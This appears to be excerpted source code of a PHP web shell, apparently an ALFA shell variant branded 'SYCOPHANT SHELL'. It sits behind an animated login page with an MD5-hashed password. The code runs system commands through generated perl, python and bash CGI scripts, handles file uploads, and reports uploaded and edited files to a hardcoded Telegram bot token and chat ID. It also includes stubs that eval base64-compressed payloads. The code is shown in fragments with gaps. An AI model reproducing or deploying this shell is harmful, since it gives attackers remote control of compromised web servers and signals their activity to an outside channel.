...
session_start();
$USERS = [
  'rakun' => '392afa6f6ade1193a2f346e3ff2cb616',
];
...
<head>
  ...
  <title>Animated Login — Split From Center</title>
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    :root{
      --red: #f00;
      --bg-img: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVXblooiUN3vGyGYBAGWT-GGISVF0cCfgBx1U17zviODUD8ldDDpYihvKXdl5E_RuO5NQsRXEdZq5PKUOnRCvlzbqsIXznylhXmHtIE0V3QOenLtsLFmxjdewRn5BPjGVjhuDIGosagCLGTjJUkqbM-UcA7kbBdr0uoo09z2XmKExzC26ATgcG3BuHRV8/s1800/wallpaper1.png');
    }
    *{margin:0;padding:0;box-sizing:border-box}
    ...
    body{
      ...
      background:#000 var(--bg-img) center / cover no-repeat fixed;
      color:#fff; overflow:hidden;
    }

    /* GRID kotak transparan */
    .grid-overlay{
      position:fixed; inset:0; z-index:2; pointer-events:none;
      background:
        repeating-linear-gradient(to right, rgb(0,0,0) 0px, rgb(0,0,0) 1px, transparent 1px, transparent 80px),
        repeating-linear-gradient(to bottom, rgb(0,0,0) 0px, rgb(0,0,0) 1px, transparent 1px, transparent 80px),
        linear-gradient(rgba(24,24,24,0.18), rgba(24,24,24,0.18));
      mix-blend-mode: normal;
    }

    /* OVERLAY: mulai dari tengah, terbagi 2, ekspansi berlawanan arah */
    .animated-overlay{
      position:fixed; inset:0; z-index:1; pointer-events:none; overflow:hidden;
    }
    .animated-overlay::before,
    .animated-overlay::after{
      content:""; position:absolute; left:0; right:0; height:50vh;
      opacity:0.75; /* atur intensitas */
    ...
    /* Atas tumbuh ke atas mulai dari tengah */
    .animated-overlay::before{
      bottom:50%;                 /* nempel di tengah */
      transform-origin: bottom center;
      animation: expandUp 6s linear infinite;
    }
    /* Bawah tumbuh ke bawah mulai dari tengah */
    .animated-overlay::after{
      top:50%;                    /* nempel di tengah */
      transform-origin: top center;
      animation: expandDown 6s linear infinite;
      /* gradien dibalik untuk bawah agar harmonis */
      background: linear-gradient(
        rgba(0,0,0,0.20),
        rgba(255,0,0,0.85),
        rgb(255, 0, 0)
    ...
    /* Animasi: skala dari 0 (di tengah) -> 1 (hingga tepi) -> 0 (ulang) */
    @keyframes expandUp{
      0%   { transform: scaleY(0);   opacity: .80; }
      50%  { transform: scaleY(1);   opacity: .60; }
      100% { transform: scaleY(0);   opacity: .00; }
    }
    ...
    .signin{
      ...
      border-radius:12px;
      padding:36px;
      box-shadow:0 15px 35px rgba(0,0,0,0.9), 0 0 0 1px rgba(255,255,255,0.05) inset;
    }
    .signin h2{
      text-transform:uppercase; letter-spacing:.06em;
      font-weight:700; font-size:2rem; color:var(--red);
      margin-bottom:24px; text-align:center;
    }
    form{display:flex; flex-direction:column; gap:18px}
    .inputBox{position:relative}
    .inputBox input{
      width:100%; background:#333; border:none; outline:none;
      padding:24px 12px 10px; border-radius:8px; color:#fff; font-size:1rem;
      transition: box-shadow .2s ease, background .2s ease;
    }
    .inputBox input:focus{ box-shadow:0 0 0 2px rgb(255,0,0) }
    .inputBox i{
      position:absolute; left:12px; top:10px; color:#aaa; font-style:normal; font-size:.9rem;
      transition:.25s; pointer-events:none;
    }
    .inputBox input:focus ~ i,
    .inputBox input:not(:placeholder-shown) ~ i{
      transform: translateY(-8px) scale(.92); opacity:.9; color:#fff;
    }
    ...
    .links a:last-child{color:var(--red); font-weight:600}
    .submit{
      padding:12px 14px; border:none; border-radius:10px; cursor:pointer;
      font-weight:800; letter-spacing:.03em; font-size:1.05rem;
      background:var(--red); color:#000; transition:transform .06s ease, opacity .15s ease;
    }
    .submit:active{ transform:translateY(1px); opacity:.85 }

    /* Responsif grid size */
    @media (max-width:900px){
      .grid-overlay{ background-size:80px 80px, 80px 80px, auto }
    }
    @media (max-width:600px){
      .grid-overlay{ background-size:64px 64px, 64px 64px, auto }
    }
  </style>
</head>
<body>
  <!-- Overlay dari tengah (split) & grid -->
  <div class="animated-overlay" aria-hidden="true"></div>
  <div class="grid-overlay" aria-hidden="true"></div>

  <!-- Card Login -->
  <div class="signin" role="dialog" aria-labelledby="title">
    <h2 id="title">SYCOPHANT SHELL</h2>
...
if (!isset($_SESSION['auth_user'])) {
    if (isset($_POST['username'], $_POST['password'])) {
        ...
        $p = $_POST['password'];
        if (isset($USERS[$u]) && md5($p) === $USERS[$u]) {
            $_SESSION['auth_user'] = $u;
            header('Location: '.$_SERVER['PHP_SELF']);
            exit;
        } else {
            login_shell('Username atau password salah.');
        }
    } else {
        login_shell();
    }
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
			...
			$perl = '';
			$py = "";
			$bash = "";
			$aspx = "";
...
function alfahead(){
$GLOBALS['__ALFA_SHELL_CODE'] = '';
...
if($move_cmd_file&&$alfa_canruncmd){
	...
	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
		...
		$message = urlencode("📤 <b>File Uploaded</b>\n🔗 <a href=\"$permalink\">" . htmlspecialchars($file['name']) . "</a>");
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/alfacgiapi/getdir.alfa")){
			$bash = "";
...
$cwd_url = str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath($GLOBALS['cwd']));
$cwd_url = '/' . ltrim($cwd_url, '/');
$filename = basename($_POST['alfa1']);
$filename_url = rawurlencode($filename);
$link = $protocol . $_SERVER['HTTP_HOST'] . rtrim($cwd_url, '/') . '/' . $filename_url;
$token = "7952379400:AAEBP4e0EqiT2h9Ho_Nu1fNOVhF6sjxoRq8";
$chat_id = "-1002856618500";
$msg = urlencode("📝 <b>File Edited</b>\n🔗 <a href=\"$link\">" . htmlspecialchars($filename) . "</a>");
...
alfahead();
$php="";
$python="";
$perl="";
$ruby="";
$node="";
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	@chdir('cgialfa');
	alfacgihtaccess('cgi');
	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $alfa_data="'.__ALFA_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("")));';
	$py = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("")),\'<string>\',\'exec\'))';
...
$bash = "";
